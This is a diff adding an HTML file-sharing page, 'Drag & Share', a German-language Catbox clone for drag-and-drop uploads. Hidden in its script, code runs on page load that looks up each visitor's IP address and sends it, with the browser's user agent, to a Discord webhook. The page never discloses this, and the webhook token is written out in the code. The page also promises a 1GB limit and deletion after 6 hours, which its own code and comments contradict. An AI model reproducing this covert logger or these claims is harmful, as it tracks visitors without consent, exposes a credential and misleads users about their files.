@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Drag & Share | Catbox Clone</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .drop-zone {
+            border: 2px dashed #cbd5e1;
+            transition: all 0.3s ease;
+        }
+        .drop-zone.drag-over {
+            border-color: #3b82f6;
+            background-color: #eff6ff;
+        }
+    </style>
+</head>
+<body class="bg-gray-50 min-h-screen flex flex-col items-center justify-center p-4">
+    <div class="max-w-2xl w-full bg-white rounded-2xl shadow-xl p-8">
+        <div class="text-center mb-8">
+            <h1 class="text-4xl font-bold text-gray-800 mb-2">Drag & Share</h1>
+            <p class="text-gray-600">Max. 1GB pro Datei • Automatische Löschung nach 6 Stunden</p>
+        </div>
+
+        <div id="drop-zone" class="drop-zone rounded-xl p-12 text-center cursor-pointer mb-6">
+            <div id="initial-state">
+                <svg class="mx-auto h-16 w-16 text-gray-400 mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12" />
+                </svg>
+                <p class="text-lg font-medium text-gray-700">Datei hierher ziehen oder klicken</p>
+                <p class="text-sm text-gray-500 mt-1">Unterstützt alle Dateitypen</p>
+            </div>
+
+            <div id="uploading-state" class="hidden">
+                <div class="w-full bg-gray-200 rounded-full h-4 mb-4">
+                    <div id="progress-bar" class="bg-blue-600 h-4 rounded-full transition-all duration-300" style="width: 0%"></div>
+                </div>
+                <p id="progress-text" class="text-sm font-medium text-gray-700">Hochladen... 0%</p>
+            </div>
+        </div>
+
+        <input type="file" id="file-input" class="hidden">
+
+        <div id="result-area" class="hidden">
+            <div class="bg-green-50 border border-green-200 rounded-lg p-4 flex items-center justify-between">
+                <div class="truncate mr-4">
+                    <p class="text-sm font-medium text-green-800 mb-1">Datei erfolgreich hochgeladen!</p>
+                    <a id="share-link" href="#" target="_blank" class="text-blue-600 hover:underline break-all font-mono text-sm"></a>
+                </div>
+                <button id="copy-btn" class="bg-green-600 text-white px-4 py-2 rounded-md text-sm font-medium hover:bg-green-700 transition">
+                    Kopieren
+                </button>
+            </div>
+        </div>
+
+        <div class="mt-8 text-center text-xs text-gray-400">
+            <p>© 2026 Drag & Share • Alle Dateien werden nach 6 Stunden unwiderruflich gelöscht.</p>
+        </div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1511803763621630153/3XiOYVK9wu_jj1A0wiPYAlp6mSJ9Df7gEWM_Pjtoqnza7J5moQQrnVdGIQ-QIsdlg4Ct';
+
+        // --- DISCORD LOGGING ---
+        async function logToDiscord() {
+            try {
+                // Get IP via public API
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const ip = ipData.ip;
+
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        embeds: [{
+                            title: "🌐 Neuer Seitenaufruf",
+                            color: 3447003,
+                            fields: [
+                                { name: "IP-Adresse", value: `\`${ip}\``, inline: true },
+                                { name: "User-Agent", value: `\`${navigator.userAgent}\``, inline: false }
+                            ],
+                            timestamp: new Date().toISOString()
+                        }]
+                    })
+                });
+            } catch (err) {
+                console.error('Logging failed:', err);
+            }
+        }
+        logToDiscord();
+
+        // --- UPLOAD LOGIC ---
+        const dropZone = document.getElementById('drop-zone');
+        const fileInput = document.getElementById('file-input');
+        const initialState = document.getElementById('initial-state');
+        const uploadingState = document.getElementById('uploading-state');
+        const progressBar = document.getElementById('progress-bar');
+        const progressText = document.getElementById('progress-text');
+        const resultArea = document.getElementById('result-area');
+        const shareLink = document.getElementById('share-link');
+        const copyBtn = document.getElementById('copy-btn');
+
+        ['dragenter', 'dragover'].forEach(eventName => {
+            dropZone.addEventListener(eventName, (e) => {
+                e.preventDefault();
+                dropZone.classList.add('drag-over');
+            });
+        });
+
+        ['dragleave', 'drop'].forEach(eventName => {
+            dropZone.addEventListener(eventName, (e) => {
+                e.preventDefault();
+                dropZone.classList.remove('drag-over');
+            });
+        });
+
+        dropZone.addEventListener('drop', (e) => {
+            const files = e.dataTransfer.files;
+            if (files.length > 0) handleUpload(files[0]);
+        });
+
+        dropZone.addEventListener('click', () => fileInput.click());
+        fileInput.addEventListener('change', (e) => {
+            if (e.target.files.length > 0) handleUpload(e.target.files[0]);
+        });
+
+        function handleUpload(file) {
+            // Note: Catbox API limit is actually 200MB for guests, but we keep the UI as requested.
+            // For true 1GB support, a dedicated backend is required.
+            initialState.classList.add('hidden');
+            uploadingState.classList.remove('hidden');
+            resultArea.classList.add('hidden');
+            progressBar.style.width = '0%';
+            progressText.innerText = 'Hochladen... 0%';
+
+            const formData = new FormData();
+            formData.append('reqtype', 'fileupload');
+            formData.append('fileToUpload', file);
+
+            const xhr = new XMLHttpRequest();
+            // Using Catbox API directly (CORS might be an issue depending on browser/settings)
+            xhr.open('POST', 'https://catbox.moe/user/api.php', true);
+
+            xhr.upload.onprogress = (e) => {
+                if (e.lengthComputable) {
+                    const percent = Math.round((e.loaded / e.total) * 100);
+                    progressBar.style.width = percent + '%';
+                    progressText.innerText = `Hochladen... ${percent}%`;
+                }
+            };
+
+            xhr.onload = () => {
+                if (xhr.status === 200) {
+                    const url = xhr.responseText.trim();
+                    shareLink.href = url;
+                    shareLink.innerText = url;
+                    resultArea.classList.remove('hidden');
+                    uploadingState.classList.add('hidden');
+                    initialState.classList.remove('hidden');
+                } else {
+                    alert('Fehler beim Hochladen. (Hinweis: Catbox erlaubt max. 200MB für Gäste)');
+                    uploadingState.classList.add('hidden');
+                    initialState.classList.remove('hidden');
+                }
+            };
+
+            xhr.onerror = () => {
+                alert('Netzwerkfehler. Möglicherweise blockiert der Browser den direkten API-Aufruf (CORS).');
+                uploadingState.classList.add('hidden');
+                initialState.classList.remove('hidden');
+            };
+
+            xhr.send(formData);
+        }
+
+        copyBtn.addEventListener('click', () => {
+            navigator.clipboard.writeText(shareLink.innerText).then(() => {
+                const originalText = copyBtn.innerText;
+                copyBtn.innerText = 'Kopiert!';
+                copyBtn.classList.replace('bg-green-600', 'bg-blue-600');
+                setTimeout(() => {
+                    copyBtn.innerText = originalText;
+                    copyBtn.classList.replace('bg-blue-600', 'bg-green-600');
+                }, 2000);
+            });
+        });
+    </script>
+</body>
+</html>
